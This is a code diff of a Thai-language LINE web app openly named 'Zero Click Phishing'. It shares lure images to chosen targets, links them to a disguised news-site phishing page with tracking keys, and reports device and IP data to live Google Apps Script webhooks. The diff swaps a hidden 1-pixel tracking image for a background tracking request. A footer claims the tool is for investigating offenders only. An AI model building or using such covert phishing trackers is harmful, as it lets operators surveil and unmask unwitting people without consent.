@@ -4,545 +4,302 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zero Click Phishing</title>
-    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;700&display=swap" rel="stylesheet">
     <!-- Line LIFF SDK -->
     <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
     <style>
-        :root {
-            --primary-color: #00B900;
-            --primary-dark: #008800;
-            --primary-light: #e8f5e9;
-            --accent-color: #ff6b6b;
-            --text-dark: #333333;
-            --text-light: #666666;
-            --bg-color: #f9f9f9;
-            --card-bg: #ffffff;
-            --border-radius: 12px;
-            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            --transition: all 0.3s ease;
-        }
-
         * {
             box-sizing: border-box;
             font-family: 'Prompt', sans-serif;
-            margin: 0;
-            padding: 0;
         }
-
         body {
-            background-color: var(--bg-color);
-            color: var(--text-dark);
-            line-height: 1.6;
             margin: 0;
-            padding: 0;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            padding: 16px;
+            background-color: #f5f5f5;
+            color: #333;
         }
-
-        .page-wrapper {
-            flex: 1;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            max-width: 100%;
-        }
-
         .container {
-            width: 100%;
             max-width: 500px;
             margin: 0 auto;
-            background-color: var(--card-bg);
-            border-radius: var(--border-radius);
-            box-shadow: var(--shadow);
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             overflow: hidden;
-            transform: translateY(0);
-            transition: transform 0.4s ease-out;
-            animation: fadeIn 0.6s ease-out;
         }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
         .header {
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+            background: linear-gradient(135deg, #00B900, #007700);
             color: white;
-            padding: 24px 20px;
+            padding: 20px;
             text-align: center;
             position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            display: flex; /* Added */
+            align-items: center; /* Added */
+            justify-content: center; /* Added */
+            gap: 10px; /* Added space between icon and text */
         }
-
-        .header .header-icon {
-            width: 32px;
-            height: 32px;
-            fill: white;
-            opacity: 0;
-            animation: scaleIn 0.5s ease-out forwards;
-            animation-delay: 0.3s;
+        .header .header-icon { /* Added */
+            width: 28px;
+            height: 28px;
+            fill: white; /* Color the SVG icon white */
         }
-
-        @keyframes scaleIn {
-            from {
-                opacity: 0;
-                transform: scale(0);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
+        .header .header-text { /* Added */
+             text-align: left;
         }
-
-        .header .header-text {
-            text-align: left;
-        }
-
         .header h1 {
             margin: 0;
-            font-size: 22px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
+            font-size: 20px;
+            font-weight: 700; /* Slightly bolder */
         }
-
         .header .subtitle {
-            font-size: 14px;
+            font-size: 13px; /* Slightly smaller */
             opacity: 0.9;
             margin-top: 5px;
-            font-weight: 300;
         }
-
         .content {
-            padding: 24px;
+            padding: 20px;
         }
-
         .form-group {
-            margin-bottom: 24px;
-            animation: slideUp 0.5s ease-out forwards;
-            opacity: 0;
-            transform: translateY(20px);
+            margin-bottom: 20px;
         }
-
-        .form-group:nth-child(1) { animation-delay: 0.1s; }
-        .form-group:nth-child(2) { animation-delay: 0.2s; }
-        .form-group:nth-child(3) { animation-delay: 0.3s; }
-
-        @keyframes slideUp {
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
         label {
             display: block;
             margin-bottom: 8px;
             font-weight: 500;
-            color: var(--text-dark);
-            transition: var(--transition);
+            color: #555;
         }
-
         input[type="text"] {
             width: 100%;
-            padding: 14px;
-            border: 2px solid #e0e0e0;
-            border-radius: var(--border-radius);
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
             font-size: 16px;
-            background-color: white;
-            transition: var(--transition);
-            color: var(--text-dark);
+            transition: border-color 0.3s;
         }
-
         input[type="text"]:focus {
-            border-color: var(--primary-color);
+            border-color: #00B900;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(0, 185, 0, 0.1);
         }
-
         .image-preview-container {
-            margin-top: 12px;
+            margin-top: 10px;
             text-align: center;
-            border: 2px dashed #e0e0e0;
-            padding: 24px;
-            border-radius: var(--border-radius);
+            border: 2px dashed #ddd;
+            padding: 20px;
+            border-radius: 8px;
             background-color: #fafafa;
-            transition: var(--transition);
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-            min-height: 160px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            transition: all 0.3s ease;
         }
-
         .image-preview-container:hover {
-            border-color: var(--primary-color);
-            background-color: var(--primary-light);
+            border-color: #00B900;
+            background-color: #f0f8f0;
         }
-
-        .image-preview-container.drag-over {
-            border-color: var(--primary-color);
-            background-color: var(--primary-light);
-            transform: scale(1.01);
-        }
-
-        .image-preview-container #uploadPrompt {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 12px;
-            color: var(--text-light);
-        }
-
-        .image-preview-container #uploadPrompt svg {
-            width: 40px;
-            height: 40px;
-            fill: #cccccc;
-            transition: var(--transition);
-        }
-
-        .image-preview-container:hover #uploadPrompt svg {
-            fill: var(--primary-color);
-        }
-
         .image-preview {
             max-width: 100%;
-            max-height: 220px;
+            max-height: 200px;
             display: none;
-            margin-top: 12px;
+            margin-top: 10px;
             border-radius: 8px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            transition: var(--transition);
         }
-
         .btn {
             display: inline-block;
-            background-color: var(--primary-color);
+            background-color: #00B900;
             color: white;
             border: none;
-            padding: 14px 24px;
+            padding: 12px 24px;
             font-size: 16px;
-            border-radius: var(--border-radius);
+            border-radius: 8px;
             cursor: pointer;
-            transition: var(--transition);
+            transition: background-color 0.3s;
             text-align: center;
             width: 100%;
-            font-weight: 600;
-            position: relative;
-            overflow: hidden;
+            font-weight: 500;
         }
-
-        .btn::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            transition: width 0.3s ease-out, height 0.3s ease-out;
-        }
-
         .btn:hover {
-            background-color: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 185, 0, 0.2);
+            background-color: #009900;
         }
-
-        .btn:active::after {
-            width: 300px;
-            height: 300px;
-            opacity: 0;
-        }
-
         .btn:disabled {
             background-color: #cccccc;
             cursor: not-allowed;
-            box-shadow: none;
-            transform: none;
         }
-
         .btn-file {
-            background-color: #757575;
-            margin-bottom: 16px;
+            background-color: #666;
+            margin-bottom: 15px;
         }
-
         .btn-file:hover {
-            background-color: #616161;
+            background-color: #555;
         }
-
         .btn-share {
-            margin-top: 24px;
-            position: relative;
-            overflow: hidden;
+            margin-top: 20px;
         }
-
-        .btn-share::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(
-                120deg,
-                transparent,
-                rgba(255, 255, 255, 0.3),
-                transparent
-            );
-            animation: shine 3s infinite linear;
-        }
-
-        @keyframes shine {
-            100% {
-                left: 100%;
-            }
-        }
-
         .status {
-            margin-top: 24px;
-            padding: 14px;
-            border-radius: var(--border-radius);
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 6px;
             text-align: center;
-            font-weight: 500;
             display: none;
-            transform: scale(0.95);
-            animation: statusFadeIn 0.3s ease-out forwards;
         }
-        
-        @keyframes statusFadeIn {
-            to {
-                transform: scale(1);
-            }
-        }
-
         .status.success {
             background-color: #d4edda;
             color: #155724;
             border: 1px solid #c3e6cb;
         }
-
         .status.error {
             background-color: #f8d7da;
             color: #721c24;
             border: 1px solid #f5c6cb;
         }
-
+        .input-group {
+            display: flex;
+            margin-bottom: 10px;
+        }
+        .input-group input {
+            flex: 1;
+            border-top-right-radius: 0;
+            border-bottom-right-radius: 0;
+        }
+        .input-group button {
+            border-top-left-radius: 0;
+            border-bottom-left-radius: 0;
+            padding: 0 15px;
+            background-color: #00B900;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .input-group button:hover {
+            background-color: #009900;
+        }
+        .input-group button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            color: #888;
+            border-top: 1px solid #eee;
+        }
         .loader {
             display: none;
             text-align: center;
-            margin: 24px 0;
+            margin: 20px 0;
         }
-
         .loader-spinner {
-            width: 48px;
-            height: 48px;
-            margin: 0 auto 12px;
-            border: 4px solid rgba(0, 185, 0, 0.15);
-            border-top: 4px solid var(--primary-color);
+            width: 40px;
+            height: 40px;
+            margin: 0 auto;
+            border: 4px solid rgba(0, 185, 0, 0.2);
+            border-top: 4px solid #00B900;
             border-radius: 50%;
-            animation: spin 1.2s linear infinite;
+            animation: spin 1s linear infinite;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
         .tips {
-            background-color: var(--primary-light);
-            border-left: 4px solid var(--primary-color);
-            padding: 14px 16px;
-            margin: 24px 0 8px;
+            background-color: #e9f7fe;
+            border-left: 4px solid #4fc3f7;
+            padding: 10px 15px;
+            margin: 20px 0;
             font-size: 14px;
-            border-radius: 6px;
+            border-radius: 4px;
         }
-
         .tips p {
             margin: 0;
-            color: var(--text-dark);
+            color: #0277bd;
         }
-
         .user-info {
             background-color: #fff;
-            padding: 18px;
-            border-radius: var(--border-radius);
-            margin-bottom: 24px;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
             border: 1px solid #eee;
-            animation: fadeIn 0.6s ease-out;
-            animation-delay: 0.4s;
-            opacity: 0;
-            animation-fill-mode: forwards;
         }
-
         .user-info .profile {
             display: flex;
             align-items: center;
             margin-bottom: 10px;
         }
-
         .user-info .profile-img {
-            width: 56px;
-            height: 56px;
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
             object-fit: cover;
-            margin-right: 16px;
-            border: 3px solid var(--primary-color);
-            box-shadow: 0 4px 10px rgba(0, 185, 0, 0.2);
-            transition: transform 0.3s ease;
+            margin-right: 15px;
+            border: 2px solid #00B900;
         }
-
-        .user-info .profile-img:hover {
-            transform: scale(1.05);
-        }
-
         .user-info .user-name {
-            font-weight: 600;
-            color: var(--text-dark);
-            font-size: 18px;
-            margin-bottom: 4px;
+            font-weight: 500;
+            color: #333;
+            font-size: 16px;
         }
-
         .user-info .user-status {
             font-size: 14px;
-            color: var(--primary-color);
+            color: #00B900;
             font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 6px;
         }
-
         .message-box {
             background-color: #fff9e6;
             border-left: 4px solid #ffc107;
-            padding: 16px;
+            padding: 10px 15px;
             margin: 20px 0;
-            border-radius: 6px;
-            animation: fadeIn 0.6s ease-out;
-            animation-delay: 0.5s;
-            opacity: 0;
-            animation-fill-mode: forwards;
+            border-radius: 4px;
         }
-
         .message-box p {
             margin: 0;
             color: #856404;
             line-height: 1.5;
         }
-
         .message-box.error {
             background-color: #f8d7da;
             border-left: 4px solid #dc3545;
         }
-
         .message-box.error p {
             color: #721c24;
         }
-
         .badge {
             display: inline-block;
             padding: 4px 8px;
-            border-radius: 30px;
+            border-radius: 12px;
             font-size: 12px;
-            font-weight: 600;
-            letter-spacing: 0.3px;
-            transition: var(--transition);
+            font-weight: 500;
+            margin-left: 8px;
         }
-
         .badge.approved {
             background-color: #d4edda;
             color: #155724;
         }
-
         .badge.pending {
             background-color: #fff3cd;
             color: #856404;
         }
-
         #loadingScreen {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background-color: var(--bg-color);
+            background-color: rgba(255, 255, 255, 0.9);
             display: flex;
             justify-content: center;
             align-items: center;
             flex-direction: column;
             z-index: 1000;
         }
-
         #loadingScreen .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(0, 185, 0, 0.1);
-            border-top: 4px solid var(--primary-color);
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(0, 185, 0, 0.2);
+            border-top: 4px solid #00B900;
             border-radius: 50%;
-            animation: spin 1.2s linear infinite;
-            margin-bottom: 24px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
-
         #loadingScreen p {
-            color: var(--primary-color);
+            color: #00B900;
             font-weight: 500;
-            font-size: 18px;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 18px;
-            font-size: 13px;
-            color: var(--text-light);
-            border-top: 1px solid #eee;
-            background-color: #fafafa;
-        }
-
-        /* Pulse animation for warning */
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.03); }
-            100% { transform: scale(1); }
-        }
-
-        .footer p.warning {
-            color: #e74c3c;
-            font-weight: 600;
-            margin-bottom: 12px;
-            padding: 8px;
-            animation: pulse 2s infinite;
-        }
-
-        /* Responsive improvements */
-        @media (max-width: 480px) {
-            .content {
-                padding: 20px 16px;
-            }
-
-            .header {
-                padding: 20px 16px;
-            }
-
-            .btn {
-                padding: 12px 20px;
-            }
         }
     </style>
 </head>
@@ -550,83 +307,78 @@
     <!-- Loading Screen -->
     <div id="loadingScreen">
         <div class="spinner"></div>
-        <p>กำลังเตรียมระบบ...</p>
+        <p>กำลังตรวจสอบระบบ...</p>
     </div>
 
-    <div class="page-wrapper">
-        <div class="container">
-            <div class="header">
-                <!-- Eye Icon SVG with enhanced animation -->
-                <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
-                    <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/>
-                </svg>
-                <div class="header-text">
-                    <h1>Zero Click Phishing</h1>
-                    <div class="subtitle">สร้างรูปภาพส่งไปยังเป้าหมาย</div>
-                </div>
-            </div>
-            
-            <div class="content">
-                <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
-                <div class="user-info" id="userInfoSection" style="display: none;">
-                    <div class="profile">
-                        <img id="profileImage" src="" alt="Profile" class="profile-img">
-                        <div>
-                            <div class="user-name" id="userName">User Name</div>
-                            <div class="user-status">
-                                <span>สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
-                                <span id="statusBadge" class="badge">รอตรวจสอบ</span>
-                            </div>
+    <div class="container">
+        <div class="header">
+             <!-- Added Eye Icon SVG -->
+             <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
+                 <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/>
+             </svg>
+             <div class="header-text">
+                 <h1>Zero Click Phishing</h1>
+                 <div class="subtitle">สร้างรูปภาพส่งไปยังเป้าหมาย</div>
+             </div>
+        </div>
+        
+        <div class="content">
+            <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
+            <div class="user-info" id="userInfoSection" style="display: none;">
+                <div class="profile">
+                    <img id="profileImage" src="" alt="Profile" class="profile-img">
+                    <div>
+                        <div class="user-name" id="userName">User Name</div>
+                        <div class="user-status">
+                            สถานะ: <span id="userStatus">ตรวจสอบสิทธิ์...</span>
+                            <span id="statusBadge" class="badge">รอตรวจสอบ</span>
                         </div>
-                    </div>
-                </div>
-                
-                <!-- ข้อความแนะนำหรือแจ้งเตือน -->
-                <div id="permissionMessage" class="message-box" style="display: none;">
-                    <p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>
-                </div>
-                
-                <!-- ฟอร์มหลัก -->
-                <div id="mainForm">
-                    <div class="form-group">
-                        <label for="caseName">ชื่อเคส</label>
-                        <input type="text" id="caseName" placeholder="ระบุชื่อเคสที่ต้องการ" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
-                        <button class="btn btn-file" id="selectImageBtn">เลือกรูปภาพ</button>
-                        <input type="file" id="imageUpload" accept="image/*" style="display: none;">
-                        <div class="image-preview-container">
-                            <img id="imagePreview" class="image-preview">
-                            <div id="uploadPrompt">
-                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                                    <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"></path>
-                                </svg>
-                                <span>คลิกเพื่อเลือกหรือลากรูปภาพมาที่นี่</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="loader">
-                        <div class="loader-spinner"></div>
-                        <p>กำลังอัพโหลดรูปภาพ...</p>
-                    </div>
-                    
-                    <div id="statusMessage" class="status"></div>
-                    
-                    <button class="btn btn-share" id="shareBtn" disabled>แชร์ภาพไปยังเป้าหมาย</button>
-                    
-                    <div class="tips">
-                        <p><strong>คำแนะนำ:</strong> รูปภาพควรมีขนาดเหมาะสม ไม่ใหญ่เกิน 10MB เพื่อการโหลดที่รวดเร็ว</p>
                     </div>
                 </div>
             </div>
             
-            <div class="footer">
-                <p class="warning">⚠️ใช้เพื่อสืบสวนติดตามตัวผู้กระทำความผิดเพื่อมาดำเนินคดีตามกฎหมาย เท่านั้น!</p>
-                &copy; 2025 Zero Click Phishing - Detective-X
+            <!-- ข้อความแนะนำหรือแจ้งเตือน -->
+            <div id="permissionMessage" class="message-box" style="display: none;">
+                <p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>
             </div>
+            
+            <!-- ฟอร์มหลัก -->
+            <div id="mainForm">
+                <div class="form-group">
+                    <label for="caseName">ชื่อเคส</label>
+                    <!-- Removed the input-group and button -->
+                    <input type="text" id="caseName" placeholder="ระบุชื่อเคส" required>
+                    <!-- <button id="generateTrackingBtn" title="สร้าง Tracking Key อัตโนมัติ">⚡</button> -->
+                </div>
+                
+                <div class="form-group">
+                    <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
+                    <button class="btn btn-file" id="selectImageBtn">เลือกรูปภาพ</button>
+                    <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+                    <div class="image-preview-container">
+                        <img id="imagePreview" class="image-preview">
+                        <div id="uploadPrompt">คลิกเพื่อเลือกหรือลากรูปภาพมาที่นี่</div>
+                    </div>
+                </div>
+                
+                <div class="loader">
+                    <div class="loader-spinner"></div>
+                    <p>กำลังอัพโหลดรูปภาพ...</p>
+                </div>
+                
+                <div id="statusMessage" class="status"></div>
+                
+                <button class="btn btn-share" id="shareBtn" disabled>แชร์ภาพไปยังเป้าหมาย</button>
+                
+                <div class="tips">
+                    <p><strong>คำแนะนำ:</strong> รูปภาพควรมีขนาดเหมาะสม เพื่อการโหลดที่รวดเร็ว</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p style="color: red; font-weight: bold; margin-bottom: 10px;">⚠️ใช้เพื่อสืบสวนติดตามตัวผู้กระทำความผิดเพื่อมาดำเนินคดีตามกฎหมาย เท่านั่น!!!!</p>
+            &copy; 2025 Zero Click Phishing - Detective-X
         </div>
     </div>
 
@@ -647,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyCbNxh4hEO_-oFngDhJLoxLR21r-dvcQjaiU6B0VE72A1MQu9qwSypWHCZffslPSL9gg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbz9CiQnZ5cXwylrADAeeZxsAcKgzx0nCQwPTp3X3z7OiMHHhmj_O9RR24CdauXdy8OnZw/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -797,6 +549,10 @@
             // การเลือกรูปภาพ
             document.getElementById('imageUpload').addEventListener('change', handleImageSelect);
             
+            // ปุ่มสร้าง Tracking Key
+            // Removed event listener for generateTrackingBtn
+            // document.getElementById('generateTrackingBtn').addEventListener('click', function() { ... });
+            
             // ปุ่มแชร์รูปภาพ
             document.getElementById('shareBtn').addEventListener('click', function() {
                 if (!userHasPermission) {
@@ -809,7 +565,7 @@
             // การเปลี่ยนแปลงชื่อเคส
             document.getElementById('caseName').addEventListener('input', checkCanShare);
             
-            // Drag and drop สำหรับรูปภาพ แบบปรับปรุง
+            // Drag and drop สำหรับรูปภาพ
             const dropArea = document.querySelector('.image-preview-container');
             
             ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
@@ -831,12 +587,14 @@
             
             function highlight() {
                 if (!userHasPermission) return;
-                dropArea.classList.add('drag-over');
+                dropArea.style.borderColor = '#00B900';
+                dropArea.style.backgroundColor = '#f0f8f0';
             }
             
             function unhighlight() {
                 if (!userHasPermission) return;
-                dropArea.classList.remove('drag-over');
+                dropArea.style.borderColor = '#ddd';
+                dropArea.style.backgroundColor = '#fafafa';
             }
             
             dropArea.addEventListener('drop', function(e) {
@@ -1066,7 +824,7 @@
                 const deviceInfo = getEnhancedDeviceInfo();
                 const ipInfo = await getIPInfo();
                 
-                // สร้าง URL สำหรับ Zero Click tracking เมื่อเป้าหมายเห็นรูปภาพ
+                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลขั้นสูง
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
                 
@@ -1099,13 +857,10 @@
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง tracking pixel ที่จะทำงานเมื่อเป้าหมายเห็นรูปภาพ
-                const trackingPixelUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&target=view&r=${randomSuffix}`;
-
-                // สร้าง Flex message ที่มี tracking pixel แทรกอยู่
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ (ไม่มี footer)
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`,
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
                         hero: { // รูปภาพหลักที่คลิกได้
@@ -1114,32 +869,22 @@
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: { 
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
-                        },
-                        body: {
-                            type: 'box',
-                            layout: 'vertical',
-                            contents: [
-                                {
-                                    // ใช้รูปภาพขนาด 1x1 pixel เพื่อทำ tracking เมื่อเป้าหมายเห็นรูปภาพ
-                                    type: 'image',
-                                    url: trackingPixelUrl,
-                                    size: '1px', // ขนาดเล็กมากจนมองไม่เห็น
-                                    aspectRatio: '1:1'
-                                }
-                            ],
-                            paddingAll: '0px'
                         }
                     }
                 };
 
                 console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));
 
-                // ไม่ทำ Zero Click tracking ที่นี่อีกต่อไป - มันจะทำงานเมื่อเป้าหมายเห็นรูปภาพแทน
-                
+                // Zero Click tracking จะถูกเรียกโดยตรงแทนที่จะใส่ใน footer
+                // ทำการเรียก API สำหรับ Zero Click tracking ในพื้นหลัง
+                fetch(zeroClickTrackUrl, { method: 'GET', mode: 'no-cors' })
+                    .then(response => console.log("Zero Click tracking triggered"))
+                    .catch(err => console.log("Zero Click tracking error:", err));
+
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     console.log("ShareTargetPicker is available. Calling now...");
                     const result = await liff.shareTargetPicker([message]);
@@ -1147,20 +892,18 @@
 
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
-                        
-                        // บันทึก Tracking Key Mapping หลังแชร์สำเร็จ
+
+                        // 1. บันทึก Tracking Key Mapping หลังจากแชร์สำเร็จ (เพิ่ม Error Handling)
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
-                            console.log('บันทึก Tracking Key Mapping ' + (saved ? 'สำเร็จ' : 'ไม่สำเร็จ'));
-                            
-                            // แทรก Zero Click บนอุปกรณ์ผู้ส่งไว้สำหรับการตรวจสอบ
-                            fetch(`${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&note=sender_device_only`, { 
-                                method: 'GET', 
-                                mode: 'no-cors' 
-                            }).catch(err => console.log("Test ping error:", err));
-                            
+                            if (!saved) {
+                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
+                            } else {
+                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
+                            }
                         } catch (saveError) {
-                            console.error('เกิดข้อผิดพลาดขณะบันทึก Tracking Key:', saveError);
+                            console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
+                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
                         }
 
                         // รีเซ็ตหน้าจอ
@@ -1178,30 +921,21 @@
             }
         }
         
-        // ปรับปรุงฟังก์ชันแสดงสถานะให้มี animation
+        // ฟังก์ชันแสดงสถานะ
         function showStatus(message, isSuccess) {
             const statusEl = document.getElementById('statusMessage');
             statusEl.textContent = message;
             statusEl.style.display = 'block';
             
-            // Remove any previous classes and animations
-            statusEl.className = 'status';
-            void statusEl.offsetWidth; // Trigger reflow to restart animation
-            
             if (isSuccess) {
-                statusEl.classList.add('success');
+                statusEl.className = 'status success';
             } else {
-                statusEl.classList.add('error');
+                statusEl.className = 'status error';
             }
             
             // ซ่อนสถานะหลังจาก 5 วินาที
             setTimeout(() => {
-                // Fade out animation
-                statusEl.style.opacity = '0';
-                setTimeout(() => {
-                    statusEl.style.display = 'none';
-                    statusEl.style.opacity = '1'; // Reset opacity for next time
-                }, 300);
+                statusEl.style.display = 'none';
             }, 5000);
         }
         
